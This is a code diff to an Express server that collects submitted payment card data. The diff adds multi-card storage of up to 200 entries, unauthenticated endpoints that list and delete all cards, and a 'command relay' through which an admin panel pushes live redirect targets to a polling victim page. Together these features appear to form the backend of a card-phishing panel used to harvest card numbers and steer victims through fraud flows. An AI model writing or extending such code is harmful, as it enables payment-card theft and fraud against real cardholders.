@@ -7,91 +7,109 @@ dotenv.config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(cors());
 app.use(express.json());
 
-// Storage en memoria (en producción sería una base de datos)
-const cardDatabase = new Map();
+// Multi-card storage — ordered list (newest first)
+let cardList = [];
+const MAX_CARDS = 200;
 
-// GET /api/health - Health check
 app.get('/api/health', (req, res) => {
-  res.json({ status: 'ok', timestamp: new Date().toISOString() });
+  res.json({ status: 'ok', timestamp: new Date().toISOString(), totalCards: cardList.length });
 });
 
-// POST /api/card-data - Guardar datos de tarjeta
+// POST /api/card-data — Save card (generates unique ID per submission)
 app.post('/api/card-data', (req, res) => {
   try {
     const data = req.body;
-    const cardId = data.cardId || 'current-card';
+    if (!data.cardNumber) return res.status(400).json({ error: 'Card number is required' });
 
-    if (!data.cardNumber) {
-      return res.status(400).json({ error: 'Card number is required' });
-    }
+    // Always generate a unique ID so multiple cards are stored separately
+    const incoming = data.cardId;
+    const cardId = (!incoming || incoming === 'current-card')
+      ? `card-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`
+      : incoming;
 
-    // Guardar en base de datos (en memoria)
-    cardDatabase.set(cardId, {
-      ...data,
-      timestamp: new Date().toISOString(),
-      updatedAt: Date.now(),
-      server: 'backend'
-    });
+    const card = { ...data, cardId, timestamp: new Date().toISOString(), updatedAt: Date.now(), server: 'backend' };
 
-    console.log(`✅ Tarjeta guardada: ${cardId}`);
-    res.json({
-      success: true,
-      message: 'Datos guardados en servidor',
-      cardId
-    });
-  } catch (error) {
-    console.error('❌ Error guardando:', error);
-    res.status(400).json({ error: error.message });
+    // Replace if same cardId exists, otherwise prepend
+    const idx = cardList.findIndex(c => c.cardId === cardId);
+    if (idx >= 0) cardList[idx] = card;
+    else { cardList.unshift(card); if (cardList.length > MAX_CARDS) cardList.pop(); }
+
+    console.log(`Card saved: ${cardId} (total: ${cardList.length})`);
+    res.json({ success: true, message: 'Datos guardados en servidor', cardId });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
   }
 });
 
-// GET /api/card-data - Obtener datos de tarjeta
+// GET /api/cards — Return all cards (new multi-card endpoint)
+app.get('/api/cards', (req, res) => {
+  const limit = Math.min(parseInt(req.query.limit) || 100, MAX_CARDS);
+  res.json({ success: true, cards: cardList.slice(0, limit), count: cardList.length });
+});
+
+// GET /api/card-data?id=xxx — Single card (backward compat)
 app.get('/api/card-data', (req, res) => {
-  try {
-    const cardId = req.query.id || 'current-card';
-    const data = cardDatabase.get(cardId);
+  const cardId = req.query.id || 'current-card';
+  const card = cardId === 'current-card' ? cardList[0] : cardList.find(c => c.cardId === cardId);
+  if (!card) return res.status(404).json({ error: 'No data found' });
+  res.json(card);
+});
 
-    if (!data) {
-      return res.status(404).json({ error: 'No data found' });
-    }
+// DELETE /api/card-data/:cardId — Remove a single card
+app.delete('/api/card-data/:cardId', (req, res) => {
+  const before = cardList.length;
+  cardList = cardList.filter(c => c.cardId !== req.params.cardId);
+  res.json({ success: true, deleted: before - cardList.length });
+});
 
-    console.log(`✅ Tarjeta obtenida: ${cardId}`);
-    res.json(data);
-  } catch (error) {
-    console.error('❌ Error obteniendo:', error);
-    res.status(500).json({ error: error.message });
+// DELETE /api/cards — Clear all cards
+app.delete('/api/cards', (req, res) => {
+  cardList = [];
+  res.json({ success: true, message: 'All cards cleared' });
+});
+
+// ── COMMAND RELAY (admin panel → suite.html) ────────────────────────────────
+// In-memory store: { cardId: { target, timestamp } }
+const commandStore = {};
+const CMD_TTL_MS = 5 * 60 * 1000; // 5 minutes
+
+// POST /api/command — admin panel writes a redirect command
+app.post('/api/command', (req, res) => {
+  const { cardId, target } = req.body || {};
+  if (!target) return res.status(400).json({ error: 'target required' });
+  const id = cardId || 'current-card';
+  const cmd = { target, timestamp: Date.now() };
+  commandStore[id] = cmd;
+  // Always also write to 'current-card' so suite.html can find it
+  commandStore['current-card'] = cmd;
+  console.log(`Command set for ${id}: redirect to ${target}`);
+  res.json({ success: true });
+});
+
+// GET /api/command?cardId=xxx — suite.html polls and consumes the command
+app.get('/api/command', (req, res) => {
+  const cardId = req.query.cardId || 'current-card';
+  const cmd = commandStore[cardId] || commandStore['current-card'];
+  if (cmd && (Date.now() - cmd.timestamp) < CMD_TTL_MS) {
+    delete commandStore[cardId];
+    delete commandStore['current-card'];
+    return res.json({ success: true, command: cmd });
   }
+  res.json({ success: true, command: null });
 });
 
-// 404 handler
-app.use((req, res) => {
-  res.status(404).json({ error: 'Not found' });
-});
+app.use((req, res) => res.status(404).json({ error: 'Not found' }));
 
-// Start server
 const server = app.listen(PORT, () => {
-  console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
-  console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
+  console.log(`Server running on port ${PORT}`);
 });
 
-// Keep-alive para Render (prevenir que se apague por inactividad)
-// Hacer un self-ping cada 10 minutos para mantener el servidor activo
+// Keep-alive ping every 10 minutes to prevent Render free-tier sleep
 setInterval(() => {
-  const url = `http://localhost:${PORT}/api/health`;
-
-  fetch(url)
-    .then(res => {
-      if (res.ok) {
-        console.log(`✅ [Keep-Alive] Ping exitoso - ${new Date().toISOString()}`);
-      }
-    })
-    .catch(err => {
-      console.error('❌ [Keep-Alive] Error:', err.message);
-    });
-}, 10 * 60 * 1000); // 10 minutos
-
-console.log('⏰ Keep-alive activado cada 10 minutos');
+  fetch(`http://localhost:${PORT}/api/health`)
+    .then(r => { if (r.ok) console.log(`Keep-alive ping OK - ${new Date().toISOString()}`); })
+    .catch(e => console.error('Keep-alive error:', e.message));
+}, 10 * 60 * 1000);
